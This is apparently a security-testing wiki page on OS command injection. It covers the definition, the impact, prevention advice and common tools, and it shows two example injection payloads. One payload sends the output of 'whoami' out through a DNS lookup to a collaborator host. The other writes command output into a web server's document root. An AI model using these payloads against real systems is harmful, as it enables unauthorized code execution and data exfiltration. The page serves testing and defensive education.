# Command Injection

## What is Command Injection?

Command injection (also called OS command injection) vulnerabilities occur when an application passes unsanitized user input to a system shell. An attacker can inject additional commands that are executed with the privileges of the web application process.

## Exploits

- [Basic Command Injection](command-injection/basic-injection.md)
- [Blind / Time-based Command Injection](command-injection/blind-injection.md)
- [Advanced Bypasses and Filter Evasion](command-injection/bypass-techniques.md)

## Impact

- Full remote code execution on the server
- Data exfiltration, modification, or deletion
- Lateral movement within the network
- Installation of persistent backdoors or malware
- Complete takeover of the underlying host

## Prevention

- Avoid calling OS commands from application code whenever possible.
- Use safe APIs and libraries instead of shells.
- If shell commands are required, use parameterized APIs or proper escaping functions provided by the language.
- Strictly validate and sanitize all input (whitelisting is preferred).
- Run the application with the lowest possible privileges.
- Implement WAF rules and monitoring for suspicious command patterns.

## Tools & Payloads

- Burp Repeater and Intruder for testing separators and payloads
- Netcat or Burp Collaborator for OAST verification
- ffuf or custom scripts for blind exploitation

**Example OAST payload (adapt domain):**
```bash
||nslookup `whoami`.your-collaborator-id.oastify.com||
```

**Writing output for blind verification:**
```bash
||whoami > /var/www/html/whoami.txt||
# Then visit http://target/whoami.txt
```

For more bypasses and payloads, refer to:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

See the [File Upload Attacks](file-upload-attacks.md) page for related techniques when shells are delivered via uploads.
